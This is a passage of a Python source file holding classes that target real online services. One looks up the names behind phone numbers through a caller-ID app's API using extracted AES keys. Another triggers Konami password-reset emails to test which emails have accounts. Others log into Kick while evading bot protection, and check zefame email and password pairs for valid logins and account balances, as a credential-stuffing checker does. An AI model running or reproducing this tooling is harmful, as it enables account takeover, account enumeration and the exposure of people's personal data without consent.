        self.k1 = base64.b64decode("Q0NFQUIyRDQ0QzFBQkFFRkU3RUQ0REZCRjY5RkU0RUI=")
        self.k2 = base64.b64decode("MDk4QkY5RkZGRUNDMDkyMjE1RTQ5Qjg2NzdERUFBMjc=")
        self.iv = b'\x00' * 16
    def get_name(self, phone, code):
        u = "https://dalily.phonebookapp.xyz/api/v5/allRequest"
        p = {"AppId":"3","AppVersionName":"15","ContactCountryCode":code,"ContactPhoneNo":phone,"FirebaseId":"dHtppn1BKbg5q7Ojy9qqxMd19VY2","IsAppInstalledFromGooglePlay":False,"LanguageCode":"ar","PackageName":"dalily.caller.ids","RequestType":"SearchByPhoneNumber"}
        try:
            j = json.dumps(p, separators=(',', ':')).encode()
            c = AES.new(self.k1, AES.MODE_CBC, self.iv)
            e = base64.b64encode(c.encrypt(pad(j, 16)))
            h = {'User-Agent': 'okhttp/4.12.0', 'Content-Type': 'application/json'}
            r = requests.post(u, data=e, headers=h, timeout=10)
            if r.status_code == 200:
                d_c = AES.new(self.k2, AES.MODE_CBC, self.iv)
                d = unpad(d_c.decrypt(base64.b64decode(r.text)), 16)
                res = json.loads(d)
                if res.get('Data'):return "\n".join([i.get('ContactName') for i in res['Data']])
            return None
        except: return None
class konami:
    def __init__(self):self.session=None
    def reset(self,email):
        try:
            self.session=requests.Session()
            h={'authority':'my.konami.net','accept':'*/*','accept-language':'en-US,en;q=0.9,ar;q=0.8','content-type':'application/json','origin':'https://my.konami.net','referer':'https://my.konami.net/en_US/password-reminder/input-email-address','sec-ch-ua':'"Chromium";v="137", "Not/A)Brand";v="24"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','sec-ch-ua-platform-version':'"13.0.0"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'}
            cok=self.session.get('https://my.konami.net/',headers=h).cookies
            bm_mi=cok.get('bm_mi');bm_sv=cok.get('bm_sv');abck=cok.get('_abck')
            r=self.session.post('https://my.konami.net/api/password-reminder/sendPasswordRemindEmail',cookies={'_rslgvry':'0b05a61f-6953-48a0-bc76-078b1a6ff12b','r_window':'off','_abck':abck,'_ga_7ELXYMVNS4':'GS2.1.s1777246762$o1$g1$t1777246781$j41$l0$h2135807605','bm_sv':bm_sv},headers=h,json={'locale':'en_US','email':email})
            t=r.text.lower()
            if r.text=='{}':return {"status":"success","message":"reset link sent","email":email,"Dev":"Odai @K33K1"}
            elif 'invalid email' in t:return {"status":"invalid","message":"invalid email","email":email,"Dev":"Odai @K33K1"}
            else:return {"status":"unknown","response":r.text,"email":email,"Dev":"Odai @K33K1"}
        except Exception as e:return {"status":"error","error":str(e),"email":email,"Dev":"Odai @K33K1"}
class kick:
    def __init__(self, proxies=None):
        self.proxies = Proxy.build(proxies) if proxies else None
        self.session = None
        self._method = None
        self.xsrf_token = None
        self.auth_token = None
        self.logged_in = False
        self.user_data = None
        self._init_session()

    def _init_session(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
        }
        try:
            import cloudscraper
            self.session = cloudscraper.create_scraper(
                browser={"browser": "chrome", "platform": "windows", "mobile": False}
            )
            self.session.headers.update(headers)
            self._method = "cloudscraper"
            return
        except ImportError:
            pass
        try:
            from curl_cffi import requests as cffi_requests
            self.session = cffi_requests.Session(impersonate="chrome")
            self.session.headers.update(headers)
            self._method = "curl_cffi"
            return
        except ImportError:
            pass
        self.session = requests.Session()
        self.session.headers.update(headers)
        self._method = "requests"

    def _req(self, method, url, **kwargs):
        kwargs.setdefault("timeout", 30)
        if self.proxies:
            kwargs["proxies"] = self.proxies
        try:
            resp = self.session.request(method, url, **kwargs)
            if resp.status_code == 404:
                return {"_error": True, "_status": 404, "message": "Not found"}
            if resp.status_code in (200, 201, 204):
                try:
                    return resp.json()
                except:
                    return {"_ok": True, "_status": resp.status_code}
            try:
                return {**resp.json(), "_status": resp.status_code}
            except:
                return {"_error": True, "_status": resp.status_code, "message": resp.text[:200]}
        except Exception as e:
            return {"_error": True, "message": str(e)}

    def _get(self, url):
        return self._req("GET", url)

    def _post(self, url, payload=None):
        return self._req("POST", url, json=payload or {})

    def _delete(self, url):
        return self._req("DELETE", url)

    def _ensure_xsrf(self):
        xsrf = dict(self.session.cookies).get("XSRF-TOKEN", "")
        if xsrf:
            self.xsrf_token = urllib.parse.unquote(xsrf)
            self.session.headers["X-XSRF-TOKEN"] = self.xsrf_token
    def login(self, email, password, otp=None):
        self._get("https://kick.com")
        token_data = self._get("https://kick.com/kick-token-provider")
        if token_data.get("_error"):
            return {"status": "error", "message": "Failed to fetch login token", "Dev": "Odai @K33K1"}

        payload = {
            "email": email,
            "password": password,
            "isMobileRequest": True,
        }
        token_name = token_data.get("nameFieldName", "")
        encrypted = token_data.get("encryptedValidFrom", "")
        if token_name:
            payload[token_name] = encrypted
        valid_from = token_data.get("validFrom", "")
        if valid_from:
            payload["_kick_token_valid_from"] = valid_from
        if otp:
            payload["one_time_password"] = otp

        self._ensure_xsrf()
        result = self._post("https://kick.com/mobile/login", payload)

        if result.get("2fa_required"):
            return {"status": "2fa_required", "message": "Two-factor code required", "Dev": "Odai @K33K1"}

        if result.get("token") or result.get("access_token"):
            self.auth_token = result.get("token") or result.get("access_token")
            self.logged_in = True
            self.user_data = self.user_info()
            return {"status": "success", "user": self.user_data, "Dev": "Odai @K33K1"}

        if result.get("_error") or result.get("_status", 200) >= 400:
            return {"status": "error", "message": result.get("message", "Login failed"), "Dev": "Odai @K33K1"}
        self.logged_in = True
        self.user_data = self.user_info()
        return {"status": "success", "user": self.user_data, "Dev": "Odai @K33K1"}

    def user_info(self):
        resp = self._get("https://kick.com/api/v1/user")
        if resp and not resp.get("_error"):
            self.user_data = resp
            return resp
        return None

    def channel_info(self, slug):
        ch = self._get(f"https://kick.com/api/v2/channels/{slug}")
        if ch.get("_error"):
            return {"status": "error", "message": "Channel not found", "Dev": "Odai @K33K1"}

        ls = self._get(f"https://kick.com/api/v2/channels/{slug}/livestream")
        cr = self._get(f"https://kick.com/api/v2/channels/{slug}/chatroom")
        live_data = None
        if ch.get("livestream") and ch["livestream"].get("is_live"):
            live_data = ch["livestream"]
        elif isinstance(ls, dict) and ls.get("data") and ls["data"].get("session_title"):
            live_data = ls["data"]
        chat_data = ch.get("chatroom", {})
        if isinstance(cr, dict) and not cr.get("_error"):
            chat_data.update(cr)

        user = ch.get("user", {})

        return {
            "status": "success",
            "channel": {
                "id": ch.get("id"),
                "slug": ch.get("slug"),
                "followers": ch.get("followers_count"),
                "verified": ch.get("verified"),
                "vod_enabled": ch.get("vod_enabled"),
                "subscription_enabled": ch.get("subscription_enabled"),
                "is_affiliate": ch.get("is_affiliate"),
            },
            "user": {
                "id": user.get("id"),
                "username": user.get("username"),
                "bio": user.get("bio"),
                "profile_pic": user.get("profile_pic"),
            },
            "livestream": {
                "is_live": bool(live_data),
                "title": live_data.get("session_title") if live_data else None,
                "viewers": live_data.get("viewer_count", 0) if live_data else 0,
                "category": (live_data.get("categories", [{}])[0].get("name")) if live_data else None,
                "started": live_data.get("start_time") if live_data else None,
                "language": live_data.get("language") if live_data else None,
            },
            "chatroom": {
                "id": chat_data.get("id"),
                "slow_mode": chat_data.get("slow_mode"),
                "followers_mode": chat_data.get("followers_mode"),
                "subscribers_mode": chat_data.get("subscribers_mode"),
                "emotes_mode": chat_data.get("emotes_mode"),
            },
            "Dev": "Odai @K33K1"
        }

    def livestream(self, slug):
        data = self._get(f"https://kick.com/api/v2/channels/{slug}/livestream")
        if data.get("_error"):
            return {"status": "error", "message": "Not found", "Dev": "Odai @K33K1"}
        live = data.get("data", {})
        return {
            "status": "success",
            "is_live": bool(live.get("session_title")),
            "title": live.get("session_title"),
            "viewers": live.get("viewers", 0),
            "category": (live.get("category") or {}).get("name"),
            "started": live.get("created_at"),
            "thumbnail": (live.get("thumbnail") or {}).get("src"),
            "Dev": "Odai @K33K1"
        }

    def chatroom(self, slug):
        cr = self._get(f"https://kick.com/api/v2/channels/{slug}/chatroom")
        if cr.get("_error"):
            return {"status": "error", "message": "Not found", "Dev": "Odai @K33K1"}
        sm = cr.get("slow_mode") or {}
        fm = cr.get("followers_mode") or {}
        sub = cr.get("subscribers_mode") or {}
        em = cr.get("emotes_mode") or {}
        return {
            "status": "success",
            "id": cr.get("id"),
            "slow_mode": sm.get("enabled", False) if isinstance(sm, dict) else False,
            "slow_interval": sm.get("message_interval", 0) if isinstance(sm, dict) else 0,
            "followers_mode": fm.get("enabled", False) if isinstance(fm, dict) else False,
            "follow_min_duration": fm.get("min_duration", 0) if isinstance(fm, dict) else 0,
            "subscribers_mode": sub.get("enabled", False) if isinstance(sub, dict) else False,
            "emotes_mode": em.get("enabled", False) if isinstance(em, dict) else False,
            "pinned": cr.get("pinned_message"),
            "Dev": "Odai @K33K1"
        }

    def clips(self, slug, cursor=0, sort="view", limit=20):
        params = f"?cursor={cursor}&sort={sort}&limit={limit}"
        data = self._get(f"https://kick.com/api/v2/channels/{slug}/clips{params}")
        if data.get("_error"):
            return {"status": "error", "message": "Not found", "Dev": "Odai @K33K1"}
        clips = data.get("clips", [])
        return {"status": "success", "clips": clips, "Dev": "Odai @K33K1"}

    def leaderboards(self, slug):
        data = self._get(f"https://kick.com/api/v2/channels/{slug}/leaderboards")
        if data.get("_error"):
            return {"status": "error", "message": "Not found", "Dev": "Odai @K33K1"}
        return {"status": "success", "leaderboards": data, "Dev": "Odai @K33K1"}

    def polls(self, slug):
        data = self._get(f"https://kick.com/api/v2/channels/{slug}/polls")
        if data.get("_error"):
            return {"status": "error", "message": "Not found", "Dev": "Odai @K33K1"}
        return {"status": "success", "polls": data, "Dev": "Odai @K33K1"}

    def followers(self, slug):
        data = self._get(f"https://kick.com/api/v1/channels/{slug}/followers")
        if data.get("_error"):
            return {"status": "error", "message": "Not found", "Dev": "Odai @K33K1"}
        return {"status": "success", "followers": data, "Dev": "Odai @K33K1"}

    def follow(self, slug):
        self._ensure_xsrf()
        resp = self._post(f"https://kick.com/api/v2/channels/{slug}/follow")
        if resp.get("_error"):
            return {"status": "error", "message": resp.get("message", "failed"), "Dev": "Odai @K33K1"}
        return {"status": "success", "Dev": "Odai @K33K1"}

    def unfollow(self, slug):
        self._ensure_xsrf()
        resp = self._delete(f"https://kick.com/api/v2/channels/{slug}/follow")
        if resp.get("_error"):
            return {"status": "error", "message": resp.get("message", "failed"), "Dev": "Odai @K33K1"}
        return {"status": "success", "Dev": "Odai @K33K1"}

    def send_message(self, chatroom_id, message):
        self._ensure_xsrf()
        resp = self._post(
            f"https://kick.com/api/v2/messages/send/{chatroom_id}",
            {"content": message, "type": "message"}
        )
        if resp.get("_error"):
            return {"status": "error", "message": resp.get("message", "failed"), "Dev": "Odai @K33K1"}
        return {"status": "success", "Dev": "Odai @K33K1"}

    def search(self, query):
        import urllib.parse
        url = f"https://kick.com/api/search?searched_word={urllib.parse.quote(query)}"
        data = self._get(url)
        if data.get("_error"):
            return {"status": "error", "message": "Search failed", "Dev": "Odai @K33K1"}
        return {"status": "success", "data": data, "Dev": "Odai @K33K1"}

    def followed_channels(self):
        data = self._get("https://kick.com/api/v2/channels/followed")
        if isinstance(data, list):
            return {"status": "success", "channels": data, "Dev": "Odai @K33K1"}
        if isinstance(data, dict) and not data.get("_error"):
            channels = data.get("channels", data.get("data", []))
            return {"status": "success", "channels": channels, "Dev": "Odai @K33K1"}
        return {"status": "error", "message": "Not logged in", "Dev": "Odai @K33K1"}
class zefame:
    @staticmethod
    def login(email, password, proxies=None):
        Dev = "Odai @K33K1"
        try:
            session = requests.Session()
            r = session.get("https://zefame.com/", proxies=Proxy.build(proxies), timeout=10)
            csrf_match = re.search(r'name="_csrf"\s*value="([^"]+)"', r.text)
            csrf = csrf_match.group(1) if csrf_match else None
            if not csrf:return {"status": "error", "msg": "CSRF token not found", "user": email, "password": password, "Dev": Dev}
            data = {"LoginForm[username]": email,"LoginForm[password]": password,"_csrf": csrf}
            headers = {"Content-Type": "application/x-www-form-urlencoded","Origin": "https://zefame.com","Referer": "https://zefame.com/","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
            response = session.post("https://zefame.com/", headers=headers, data=data, proxies=Proxy.build(proxies), timeout=15)
            text = response.text
            if "Identifiant ou mot de passe incorrect" in text:return {"status": "bad password", "user": email, "password": password, "Dev": Dev}
            elif any(kw in text for kw in ["طلب جديد", "New order", "Nouvelle commande", "Dashboard"]):
                name_match = re.search(r'<div class="g-name\s*">\s*([^<]+)', text)
                balance_match = re.search(r'<h3>([\d.,]+)\s*€?\s*</h3>', text)
                balance = None
                if balance_match:
                    try:balance = float(balance_match.group(1).replace(",", "."))
                    except:balance = "Unknown"
                return {"status": "success","user": email,"password": password,"fullname": name_match.group(1).strip() if name_match else None,"balance": balance,"Dev": Dev}
            else:return {"status": "unknown response", "user": email, "password": password, "Dev": Dev}
        except Exception as e:return {"status": "error", "error": str(e), "user": email, "password": password, "Dev": Dev}
class github:
    BASE = "https://api.github.com"
    @staticmethod
    def info(username: str, proxies=None) -> dict:
        Dev = "Odai @K33K1"
        try:
            url = f"{github.BASE}/users/{username}"
            resp = requests.get(url, proxies=None, timeout=15)
            if resp.status_code != 200:return {"status": "error", "message": f"HTTP {resp.status_code}", "Dev": Dev}
            data = resp.json()
            return {"status": "success","data": {"username": data.get("login"),"name": data.get("name"),"bio": data.get("bio"),"company": data.get("company"),"location": data.get("location"),"email": data.get("email"),"blog": data.get("blog"),"twitter_username": data.get("twitter_username"),"followers": data.get("followers"),"following": data.get("following"),"public_repos": data.get("public_repos"),"public_gists": data.get("public_gists"),"type": data.get("type"),"created_at": data.get("created_at"),"updated_at": data.get("updated_at"),"avatar_url": data.get("avatar_url"),"html_url": data.get("html_url"),},"Dev": Dev}
        except Exception as e:return {"status": "error", "error": str(e), "Dev": Dev}
    @staticmethod
    def repositoriesinfo(username: str, proxies=None) -> dict:
        Dev = "Odai @K33K1"
        try:
            url = f"{github.BASE}/users/{username}/repos"
            resp = requests.get(url, proxies=Proxy.build(proxies), timeout=15)
            if resp.status_code != 200:return {"status": "error", "message": f"HTTP {resp.status_code}", "Dev": Dev}
            repos = resp.json()
            result = [{"name": repo.get("name"),"description": repo.get("description"),"language": repo.get("language"),"stargazers_count": repo.get("stargazers_count"),"forks_count": repo.get("forks_count"),"watchers_count": repo.get("watchers_count"),"open_issues_count": repo.get("open_issues_count"),"private": repo.get("private"),"fork": repo.get("fork"),"created_at": repo.get("created_at"),"updated_at": repo.get("updated_at"),"html_url": repo.get("html_url"),"clone_url": repo.get("clone_url"),"default_branch": repo.get("default_branch"),} for repo in repos]
            return {"status": "success", "repositoriescount": len(result), "data": result, "Dev": Dev}
        except Exception as e:return {"status": "error", "error": str(e), "Dev": Dev}
    @staticmethod
    def followersinfo(username: str, proxies=None) -> dict:
        Dev = "Odai @K33K1"
        try:
            url = f"{github.BASE}/users/{username}/followers"
            resp = requests.get(url, proxies=Proxy.build(proxies), timeout=15)
            if resp.status_code != 200:return {"status": "error", "message": f"HTTP {resp.status_code}", "Dev": Dev}
            followers = resp.json()
            result = [{"username": u.get("login"),"id": u.get("id"),"type": u.get("type"),"html_url": u.get("html_url"),"avatar_url": u.get("avatar_url"),} for u in followers]
            return {"status": "success", "followerscount": len(result), "data": result, "Dev": Dev}
        except Exception as e:return {"status": "error", "error": str(e), "Dev": Dev}
    @staticmethod
    def followingsinfo(username: str, proxies=None) -> dict:
        Dev = "Odai @K33K1"
        try:
            url = f"{github.BASE}/users/{username}/following"
            resp = requests.get(url, proxies=Proxy.build(proxies), timeout=15)
            if resp.status_code != 200:return {"status": "error", "message": f"HTTP {resp.status_code}", "Dev": Dev}
            following = resp.json()
            result = [{"username": u.get("login"),"id": u.get("id"),"type": u.get("type"),"html_url": u.get("html_url"),"avatar_url": u.get("avatar_url"),} for u in following]
            return {"status": "success", "followingcount": len(result), "data": result, "Dev": Dev}
        except Exception as e:return {"status": "error", "error": str(e), "Dev": Dev}